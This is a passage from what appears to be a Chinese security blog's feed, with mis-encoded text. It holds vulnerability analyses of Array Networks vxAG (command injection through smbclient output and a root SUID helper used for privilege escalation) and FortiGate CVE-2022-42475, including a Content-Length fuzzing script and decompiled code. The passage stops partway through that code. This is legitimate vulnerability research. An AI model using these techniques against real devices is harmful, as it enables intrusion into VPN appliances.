class="regexp">/^$delimiter2$/m</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@output = <span class="keyword">split</span>(<span class="regexp">/^$delimiter1$/m</span>, $output);</span><br><span class="line">	@output = <span class="keyword">split</span>(<span class="regexp">/^$delimiter2$/m</span>, $output[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	$output = $output[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	$output =~ <span class="regexp">s/^\s+//</span>;</span><br><span class="line">	$output =~ <span class="regexp">s/\s+$//</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™äº›å‡½æ•°å°è¯•åœ¨å‘½ä»¤çš„è¾“å‡ºä¸­åŒ¹é…ä¸€äº›å­—ç¬¦ä¸²ï¼Œå¦‚æœåŒ¹é…æˆåŠŸåˆ™è¿”å›æˆåŠŸã€‚</p>
<p>é¦–å…ˆæŒ‰ç…§ä»£ç ä¸­çš„å‘½ä»¤æ„é€ ä¸€æ¡ï¼Œåœ¨è®¾å¤‡çš„ç»ˆç«¯æ‰§è¡Œï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_18.png"
                     
                ></p>
<p>éšæ„æ„é€ çš„æœåŠ¡å™¨åœ°å€å¯¼è‡´è¿”å›æ— æ³•è¿æ¥é”™è¯¯ä¿¡æ¯ã€‚æˆ‘ä»¬çœ‹åˆ° smbclient å¸¦æœ‰ä¸€ä¸ª -M é€‰é¡¹ï¼Œå°è¯•æ·»åŠ æ­¤é€‰é¡¹ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_19.png"
                     
                ></p>
<p>æ·»åŠ é€‰é¡¹ä¹‹åæ‰“å°äº†æˆ‘ä»¬æ§åˆ¶çš„ä¿¡æ¯ã€‚åˆç†åˆ©ç”¨å„ä¸ªå‚æ•°æ¥æ’å¸ƒè¿™äº›é”™è¯¯ä¿¡æ¯ï¼Œç»“åˆä»£ç åˆ¤æ–­å‘½ä»¤æˆåŠŸçš„æ–¹å¼ï¼Œå°±å¯ä»¥ç»•è¿‡è¿™äº›åˆ¤æ–­å‡½æ•°ï¼Œä»è€Œæ‰§è¡Œåˆ° printFileã€‚è¿™æ · path å‚æ•°å°±å®Œå…¨å¯æ§ï¼Œä¸å—éæ³•å­—ç¬¦é™åˆ¶ï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ å‘½ä»¤æ³¨å…¥ payloadï¼Œå¹¶åœ¨å…¶æœ«å°¾æ·»åŠ ä¸€ä¸ª <code>|</code> å­—ç¬¦å³å¯å®ç°ä»£ç æ‰§è¡Œã€‚</p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>é€šè¿‡ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œåªèƒ½ä»¥ nobody æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦è€ƒè™‘å¦‚ä½•ææƒã€‚</p>
<p>ææƒé¦–å…ˆè¦è€ƒè™‘ä½¿ç”¨ç³»ç»Ÿä¸­è‡ªå¸¦çš„ï¼Œå…·æœ‰ SUID æƒé™çš„äºŒè¿›åˆ¶ç¨‹åºï¼Œé€šè¿‡ç­›é€‰æ­¤ç±»æ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåä¸º webui_localdb_file çš„ç¨‹åºã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  seteuid(<span class="number">0</span>);</span><br><span class="line">  setegid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *argv[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">      <span class="built_in">snprintf</span>(cmd_str, <span class="number">0x400</span>uLL, <span class="string">&quot;cp %s/%s %s/%s&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, argv[<span class="number">2</span>], <span class="string">&quot;/ca/fileshare/htdocs/client_sec/l3vpn&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">      <span class="built_in">snprintf</span>(path_str, <span class="number">0x200</span>uLL, <span class="string">&quot;/ca/conf/uconf/%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( lstat(path_str, &amp;sb) == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(cmd_str, <span class="number">0x400</span>uLL, <span class="string">&quot;mkdir -p -v -m 755 /%s&quot;</span>, path_str);</span><br><span class="line">        system(cmd_str);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(cmd_str, <span class="number">0</span>, <span class="keyword">sizeof</span>(cmd_str));</span><br><span class="line">      <span class="built_in">snprintf</span>(cmd_str, <span class="number">0x400</span>uLL, <span class="string">&quot;cp %s/%s %s/%s&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, argv[<span class="number">3</span>], path_str, argv[<span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çœ‹åˆ°ç¨‹åºé¦–å…ˆè°ƒç”¨ seteuid å’Œ setegid è®¾ç½®æƒé™åˆ° rootï¼Œç„¶åæ ¹æ®å¤–éƒ¨ä¼ å…¥çš„å‚æ•°æ‰§è¡Œå„ç§å‘½ä»¤ï¼Œæ˜¾ç„¶å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œåˆ©ç”¨æ­¤ç¨‹åºå³å¯å®ç°æƒé™æå‡ã€‚</p>
<h2 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h2><p>è¯·è§‚çœ‹ä¸‹é¢çš„æ¼”ç¤ºè§†é¢‘ï¼š</p>
<p><video controls height='100%' width='100%' src="/img/array_vxag2_01.mp4"></video></p>
<p>æœ¬æ–‡ä»‹ç»äº†å…³äº ArrayNetworks vxAG è®¾å¤‡ License ç ´è§£å’Œ SSLVPN è¿œç¨‹ä»£ç æ‰§è¡Œçš„ç›¸å…³å†…å®¹ï¼Œæ–‡ä¸­è¿˜æœ‰ä¸€äº›ç»†èŠ‚éœ€è¦è§£å†³ï¼Œå¦å¤–åœ¨æ–°ç‰ˆä¸­ webui_localdb_file å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ã€‚å¦‚ä½•åœ¨æ–°ç‰ˆä¸­å®ç°ææƒï¼Ÿå¦‚ä½•è§£å†³ä»£ç æ‰§è¡Œä¸­çš„ä¸€äº›å°é—®é¢˜ï¼Ÿæˆ‘ä»¬å°±ç•™ç»™è¯»è€…å»æ¢ç´¢å§ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-42475</title>
    <url>/2022/12/15/CVE-2022-42475/</url>
    <content><![CDATA[<p>2022 å¹´ 12 æœˆ 12 æ—¥ï¼ŒFortinet å®˜æ–¹å‘å¸ƒäº†å½±å“ FortiGate SSLVPN çš„ RCE æ¼æ´ CVE-2022-42475 ç›¸å…³ä¿¡æ¯ã€‚å®˜æ–¹å…¬å‘Šæ˜¾ç¤ºè¯¥æ¼æ´å·²ç»è¢«å‘ç°åœ¨é‡åˆ©ç”¨ï¼Œå»ºè®®æ‰€æœ‰ç”¨æˆ·å°½å¿«å‡çº§ã€‚æœ¬æ–‡å¯¹æ­¤æ¼æ´çš„æˆå› è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>Fortinet å®˜æ–¹å¯¹ Fortigate ç­‰è®¾å¤‡çš„è™šæ‹Ÿæœºç‰ˆæœ¬å¼€æ”¾ä¸‹è½½ï¼Œä¸‹è½½é“¾æ¥ï¼š<a class="link"   href="https://support.fortinet.com/Download/VMImages.aspx" >https://support.fortinet.com/Download/VMImages.aspx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ä¸‹è½½åˆ°è™šæ‹Ÿæœºé•œåƒåå¯¼å…¥ vmware å®‰è£…ï¼Œç¬¬ä¸€æ¬¡å¯åŠ¨å…ˆé…ç½®ç½‘ç»œ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨é»˜è®¤ç”¨æˆ· admin:ç©ºå¯†ç  ç™»å½•åˆ° CLI</span><br><span class="line"></span><br><span class="line">config system interface</span><br><span class="line">edit port1</span><br><span class="line">set mode static</span><br><span class="line">set ip 192.168.x.x/255.255.255.0</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

<p>é…ç½®å¥½ç½‘ç»œåé€šè¿‡æµè§ˆå™¨è®¿é—®åˆ°è®¾å¤‡ web ç•Œé¢ï¼Œé¦–æ¬¡ç™»å½•ç³»ç»Ÿä¼šè¦æ±‚å¯¼å…¥ licenseã€‚è¿™é‡Œæœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€æ˜¯å®Œæ•´ licenseï¼ŒäºŒæ˜¯è¯•ç”¨ç‰ˆã€‚æˆ‘ä»¬é€‰æ‹©è¯•ç”¨ç‰ˆ licenseï¼Œå…ˆå»å®˜æ–¹ç½‘ç«™æ³¨å†Œä¸€ä¸ª FortiCloud è´¦å·ï¼Œç„¶ååœ¨ç³»ç»Ÿä¸Šç™»å½•ï¼Œç­‰å¾…é‡å¯å³å¯ã€‚(ä¹Ÿå¯ä»¥å‚è€ƒ<a href="https://wzt.ac.cn/2023/03/02/fortios_padding/">æ–‡ç« </a>å°è¯•ç ´è§£ License æˆæƒ)</p>
<p><strong>æ³¨æ„ï¼å¦‚æœé€‰æ‹©ä½¿ç”¨è¯„ä¼°ç‰ˆæœ¬ Licenseï¼Œè®¾å¤‡ä¼šè¿›å…¥ LENC æ¨¡å¼ï¼Œåœ¨è¯¥æ¨¡å¼ä¸‹ä¸èƒ½ä½¿ç”¨é«˜çº§åŠ å¯†ç®—æ³•ï¼Œç›¸åº”çš„ï¼Œåªèƒ½ä½¿ç”¨ SSLv3 æˆ– TLSv1.0 ç­‰è¿‡æ—¶çš„åŠ å¯†é“¾æ¥ã€‚æ­¤æ—¶å¯èƒ½ä¼šé‡åˆ° SSL_VERSION_OR_CIPHER_MISMATCH ç­‰é”™è¯¯ã€‚</strong></p>
<p>æ¼æ´ä½äºè®¾å¤‡çš„ SSLVPN åŠŸèƒ½ä¸­ï¼Œåˆ†æå‰éœ€è¦é…ç½® VPN åŠŸèƒ½ã€‚é…ç½®è¿‡ç¨‹å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œç®€å•æ¥è¯´ï¼Œé¦–å…ˆåœ¨ User &amp; Authentication -&gt; User Definition åŠŸèƒ½ä¸­åˆ›å»ºä¸€äº› VPN è´¦æˆ·ï¼Œæ·»åŠ åˆ°åŒä¸€ä¸ª group ä¸­ã€‚ç„¶ååœ¨ VPN -&gt; SSL-VPN Settings ä¸­å¡«å†™ç›‘å¬ç½‘å¡å’Œç«¯å£ç­‰ä¿¡æ¯ã€‚æœ€åæŒ‰ç…§æç¤ºåˆ›å»ºä¸€æ¡é˜²ç«å¢™è§„åˆ™å…è®¸å¤–éƒ¨è¯·æ±‚è¿›å…¥ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-1.png"
                     
                ></p>
<p>è¿™æ ·è®¿é—®å¯¹åº”æ¥å£å³å¯çœ‹åˆ° SSLVPN ç•Œé¢ã€‚</p>
<h2 id="ä»£ç å’Œæƒé™è·å–"><a href="#ä»£ç å’Œæƒé™è·å–" class="headerlink" title="ä»£ç å’Œæƒé™è·å–"></a>ä»£ç å’Œæƒé™è·å–</h2><p>æˆ‘ä»¬é‡‡ç”¨æŒ‚è½½ç£ç›˜çš„æ–¹æ³•ï¼Œå…³é—­è™šæ‹Ÿæœºï¼Œå°†è¾ƒå°çš„ç£ç›˜å¸è½½å¹¶æŒ‚è½½åˆ°å¦ä¸€å° Linux ç³»ç»Ÿä¸Šï¼Œå¼€æœºä¹‹åçœ‹åˆ°ç³»ç»Ÿè¯†åˆ«åˆ°ä¸€äº›ç¡¬ç›˜åˆ†åŒºï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-2.png"
                     
                ></p>
<p>åœ¨ FORTIOS åˆ†åŒºä¸­çš„ rootfs.gz æ˜¯ä¸»è¦æ–‡ä»¶ç³»ç»Ÿï¼Œå°†å…¶è§£å‹å¾—åˆ°ä¸€äº›ç³»ç»Ÿæ–‡ä»¶ï¼Œä½† bin ç­‰ç›®å½•ä¸‹æ²¡æœ‰ä»»ä½•å†…å®¹ã€‚æˆ‘ä»¬å‚è€ƒç½‘ç»œä¸Šçš„æ–‡ç« å‘ç°å…³é”®æ–‡ä»¶åœ¨ bin.tar.xzã€migadmin.tar.xz ç­‰å‹ç¼©åŒ…å†…ï¼Œè¿™äº›å‹ç¼©æ¡£æ¡ˆä½¿ç”¨ Fortinet è‡ªå·±ä¿®æ”¹è¿‡çš„å·¥å…·æ‰“åŒ…ã€‚å…·ä½“è§£åŒ…æ–¹æ³•ï¼Œåœ¨è§£å‹ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /migadmin.tar</span><br></pre></td></tr></table></figure></div>

<p>è§£åŒ…ä¹‹åæ‰¾åˆ° &#x2F;bin&#x2F;initï¼Œç³»ç»Ÿä¸­çš„å¤§éƒ¨åˆ†ä¸šåŠ¡ç¨‹åºéƒ½è½¯é“¾æ¥åˆ°è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯æˆ‘ä»¬ä¸»è¦çš„åˆ†æç›®æ ‡ã€‚</p>
<p>æŒ‰ç…§ç›¸åŒçš„æ–¹æ³•æå–å‡º 7.2.2 å’Œ 7.2.3 ä¸­çš„ init æ–‡ä»¶ï¼Œå‡†å¤‡è¿›è¡Œè¡¥ä¸åˆ†æã€‚</p>
<p>æƒé™è·å–å¯å‚è€ƒç½‘ç»œæ–‡ç« ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é¦–å…ˆè¿›è¡Œè¡¥ä¸å¯¹æ¯”ï¼Œå°†ä¸åŒç‰ˆæœ¬çš„ init ç¨‹åºå¯¼å…¥ IDA åˆ†æï¼Œä¿å­˜ idb ä¹‹åç”¨ bindiff æ¯”è¾ƒï¼Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œç›´æ¥ä½¿ç”¨ bindiff GUI å¯èƒ½ä¼šå¡åœ¨è§£åŒ… idb é˜¶æ®µï¼Œå»ºè®®ä½¿ç”¨ IDA ä¸­çš„ bindiff æ’ä»¶æ¯”å¯¹ï¼Œç¨‹åºè¾ƒå¤§éœ€è¦åˆ†æè¾ƒé•¿æ—¶é—´ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-3.png"
                     
                ></p>
<p>æ¯”è¾ƒå®ŒæˆåæŒ‰ç…§ç›¸ä¼¼åº¦å’Œç½®ä¿¡åº¦é€ä¸ªåˆ†æä»£ç å·®å¼‚ï¼Œæ–°ç‰ˆæœ¬å¯¹ wad éƒ¨åˆ†è¿›è¡Œäº†å¾ˆå¤šä¿®æ”¹ï¼Œé™¤æ­¤ä¹‹å¤–æ¯”è¾ƒæ˜æ˜¾çš„ä¿®æ”¹ä½äºå†…å­˜åˆ†é…å‡½æ•°ä¸­ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œ7.2.2 ç‰ˆæœ¬ä¸­æŸå†…å­˜åˆ†é…å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1776C70</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  v4 = je_malloc();</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_16CFB00(<span class="number">0</span>, <span class="number">8</span>, <span class="string">&quot;malloc(%ld) calling from %s:%d failed.\n&quot;</span>, a1, a2, a3);</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">  ++qword_A8AC610;</span><br><span class="line">  <span class="keyword">if</span> ( !byte_A8AC620 )</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  sub_1777590(v4, a1, a2, a3);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ 7.2.3 ä¸­å¯¹åº”å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1776E60</span><span class="params">(<span class="type">unsigned</span> __int64 a1, __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x40000000</span> )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  v5 = je_malloc();</span><br><span class="line">  v3 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_16CFB30(<span class="number">0</span>, <span class="number">8</span>, <span class="string">&quot;malloc(%ld) calling from %s:%d failed.\n&quot;</span>, a1, a2, a3);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  ++qword_A8AD770;</span><br><span class="line">  <span class="keyword">if</span> ( !byte_A8AD780 )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  sub_17777D0(v5, a1, a2, a3);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å‘ç°æ–°ç‰ˆæœ¬çš„å†…å­˜åˆ†é…ç›¸å…³å‡½æ•°ä¸­éƒ½æ·»åŠ äº†å¯¹ size çš„åˆ¤æ–­ï¼Œè¦æ±‚å…¶ä¸èƒ½å¤§äº 0x40000000</p>
<p>è€ƒè™‘åˆ°è¯¥æ¼æ´æ˜¯ä¸€ä¸ªå †å†…å­˜æº¢å‡ºï¼Œæ ¹æ®ä¿®å¤æ–¹å¼æ¨æµ‹æ¼æ´çš„æ ¹æœ¬åŸå› å¯èƒ½æ˜¯æŸå¤„å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œå¯¼è‡´å†…å­˜åˆ†é…å‡½æ•°è¿”å›äº†ä¸€å—è¾ƒå°çš„å†…å­˜ï¼Œè€Œåç»­æ‹·è´æ•°æ®æ—¶åˆä½¿ç”¨äº†è¾ƒå¤§çš„ sizeã€‚</p>
<p>è€Œåœ¨ HTTP è¯·æ±‚ä¸­å¯èƒ½æœ‰ä¸¤ç§æƒ…å†µä¼šå¯¼è‡´ä»¥ä¸Šç»“æœï¼Œä¸€æ˜¯æŸäº›åŠŸèƒ½ handler å‡½æ•°ä¸­å¯¹ç”¨æˆ·æäº¤çš„å‚æ•°éªŒè¯ä¸ä¸¥æ ¼ï¼Œæˆ–è€…ä»£ç åœ¨è§£æè¯·æ±‚æ—¶å¯¹ Content-Length çš„è§£æå‡ºç°å¼‚å¸¸ã€‚</p>
<p>sslvpn ä¸­åœ¨æœªæˆæƒæƒ…å†µä¸‹èƒ½å¤Ÿè®¿é—®çš„åŠŸèƒ½ç‚¹ä¸å¤šï¼Œæ¼æ´å‡ºç°åœ¨è¯·æ±‚è§£æé˜¶æ®µå¯èƒ½æ€§æ¯”è¾ƒå¤§ã€‚sslvpnd æ˜¯åŸºäº Apache httpd ä¿®æ”¹è€Œæ¥ï¼Œå¼€å‘è€…åœ¨å…¶ä¸­æ·»åŠ äº†å¾ˆå¤šè‡ªå®šä¹‰ä»£ç ï¼Œå¯¼è‡´å¤æ‚åº¦è¾ƒé«˜ï¼Œè€Œä¸”ç¨‹åºä¸åŒ…å«ç¬¦å·ä¿¡æ¯ï¼Œåˆ†æèµ·æ¥ä¼šæ¶ˆè€—å¾ˆå¤šæ—¶é—´ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é‡‡å–æ›´ç®€å•çš„æ–¹æ³•ï¼ŒåŸºäºè¡¥ä¸åˆ†æå’Œæ¨æµ‹ï¼Œæ¼æ´å¯èƒ½å‘ç”Ÿåœ¨è§£æè¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯å¤„ç† Content-Length é˜¶æ®µã€‚é‚£ä¹ˆåªéœ€è¦æŒ‰ç…§ fuzz HTTP åè®®çš„æ€è·¯ï¼Œæ„é€ ä¸€äº›å¸¦æœ‰ç•¸å½¢ Content-Length çš„è¯·æ±‚ï¼Œä¾‹å¦‚ CL è¿‡å¤§ã€æˆ–è€…ç­‰äºè´Ÿæ•°çš„æƒ…å†µï¼Œå°†è¿™äº›è¯·æ±‚å‘é€åˆ°èƒ½å¤Ÿæœªæˆæƒè®¿é—®çš„æ¥å£ä¸­ï¼ŒåŒæ—¶æ£€æµ‹ web æœåŠ¡çŠ¶æ€ï¼Œå‘ç”Ÿå´©æºƒæˆ–æ— æ³•æ”¶åˆ°å“åº”æ—¶è®°å½•ä¸‹å¯¹åº”çš„è¯·æ±‚æŠ¥æ–‡ã€‚</p>
<p>ç¼–å†™å‡ºæµ‹è¯•è„šæœ¬ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/remote/login&quot;</span>.encode()</span><br><span class="line">content_length = [<span class="string">&quot;0&quot;</span>, <span class="string">&quot;-1&quot;</span>, <span class="string">&quot;2147483647&quot;</span>, <span class="string">&quot;2147483648&quot;</span>, <span class="string">&quot;-0&quot;</span>, <span class="string">&quot;4294967295&quot;</span>, <span class="string">&quot;4294967296&quot;</span>, <span class="string">&quot;1111111111111&quot;</span>, <span class="string">&quot;22222222222&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> CL <span class="keyword">in</span> content_length:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = <span class="string">b&quot;POST &quot;</span> + path + <span class="string">b&quot; HTTP/1.1\r\nHost: 192.168.232.129\r\nContent-Length: &quot;</span> + CL.encode() + <span class="string">b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;</span></span><br><span class="line">        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        _socket.connect((<span class="string">&quot;192.168.232.129&quot;</span>, <span class="number">4443</span>))</span><br><span class="line">        _default_context = ssl._create_unverified_context()</span><br><span class="line">        _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">        _socket.sendall(data)</span><br><span class="line">        res = _socket.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;HTTP/1.1&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error detected&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(CL)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error detected&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(CL)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œåå½“å‘é€ CL ç­‰äº 2147483647 æ—¶æœåŠ¡å™¨æ²¡æœ‰å“åº”ï¼Œæ‰‹åŠ¨æµ‹è¯•ç»“æœä¹Ÿä¸€è‡´ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-4.png"
                     
                ></p>
<p>æŒ‚è½½è°ƒè¯•å™¨å°è¯•æ•è·å¼‚å¸¸ä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-5.png"
                     
                ></p>
<p>å‘åŒ…ä¹‹åäº§ç”Ÿæ®µé”™è¯¯ï¼Œè®¿é—® rdi æ—¶é‡åˆ°éæ³•åœ°å€ã€‚é€šè¿‡æ ˆå›æº¯åˆ†æå…¶è°ƒç”¨ä¿¡æ¯ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†å…³é”®å‡½æ•° read_post_data</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_post_data</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v1; <span class="comment">// r12</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// er12</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 content_length; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// er12</span></span><br><span class="line"></span><br><span class="line">  v1 = *(a1 + <span class="number">736</span>);</span><br><span class="line">  v2 = get_req(*(a1 + <span class="number">664</span>));</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !*(v2 + <span class="number">8</span>) )</span><br><span class="line">    *(v2 + <span class="number">8</span>) = pool_alloc(*v1, *(v2 + <span class="number">24</span>) + <span class="number">1</span>);    <span class="comment">// Content-Length</span></span><br><span class="line">  v4 = unknow_0(v1, v3 + <span class="number">32</span>, <span class="number">8190LL</span>);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( unknow_1(*(a1 + <span class="number">616</span>)) - <span class="number">1</span> &lt;= <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *(v3 + <span class="number">16</span>);</span><br><span class="line">      content_length = *(v3 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 + v4 &gt; content_length )</span><br><span class="line">        v5 = *(v3 + <span class="number">24</span>) - v6;</span><br><span class="line">      <span class="keyword">if</span> ( content_length &gt; v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((*(v3 + <span class="number">8</span>) + v6), (v3 + <span class="number">32</span>), v5);</span><br><span class="line">        v10 = *(v3 + <span class="number">24</span>);</span><br><span class="line">        v11 = *(v3 + <span class="number">16</span>) + v5;</span><br><span class="line">        *(v3 + <span class="number">16</span>) = v11;</span><br><span class="line">        <span class="keyword">if</span> ( v11 &lt; v10 )</span><br><span class="line">          <span class="keyword">return</span> <span 